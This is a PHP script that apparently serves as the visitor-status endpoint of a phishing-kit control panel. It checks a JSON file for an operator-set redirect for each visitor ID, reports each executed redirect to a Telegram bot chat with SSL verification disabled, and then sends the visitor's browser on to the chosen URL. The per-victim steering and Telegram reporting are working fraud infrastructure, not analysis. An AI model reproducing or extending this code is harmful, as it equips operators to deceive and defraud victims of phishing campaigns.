<?php
// Initialize session with cPanel compatibility
require_once(__DIR__ . '/session_init.php');

// Use absolute path for config.php
require_once(__DIR__ . '/config.php');
header('Content-Type: application/json');

$visitor_id = $_GET['visitor_id'] ?? '';
error_log("Checking status for visitor: " . $visitor_id);

if (empty($visitor_id)) {
    error_log("Empty visitor ID");
    die(json_encode(['redirect' => false]));
}

$redirects_file = __DIR__ . '/session/redirects.json';
if (!file_exists($redirects_file)) {
    error_log("Redirects file not found");
    die(json_encode(['redirect' => false]));
}

$redirects = json_decode(file_get_contents($redirects_file), true);
error_log("Current redirects: " . print_r($redirects, true));

if (isset($redirects['redirects'][$visitor_id])) {
    $visitor_data = $redirects['redirects'][$visitor_id];
    
    if ($visitor_data['status'] === 'ready' && isset($visitor_data['redirect_url'])) {
        error_log("Found redirect for visitor: " . $visitor_id . " -> " . $visitor_data['redirect_url']);
        
        // Send confirmation to Telegram
        $msgtg = "🔄 <b>REDIRECT EXECUTED</b>\n\n";
        $msgtg .= "• Visitor ID: <code>{$visitor_id}</code>\n";
        $msgtg .= "• Redirect To: <code>{$visitor_data['redirect_url']}</code>\n";
        $msgtg .= "• Time: " . date('Y-m-d H:i:s') . "\n";
        
        $send = [
            'chat_id' => $settings['chat_id'],
            'text' => $msgtg,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];
        
        $website = "https://api.telegram.org/bot{$settings['bot_url']}";
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
        
        // Remove this visitor's data
        unset($redirects['redirects'][$visitor_id]);
        file_put_contents($redirects_file, json_encode($redirects, JSON_PRETTY_PRINT));
        
        echo json_encode([
            'redirect' => true,
            'redirect_url' => $visitor_data['redirect_url']
        ]);
        exit();
    }
}

error_log("No redirect ready for visitor: " . $visitor_id);
echo json_encode(['redirect' => false]); 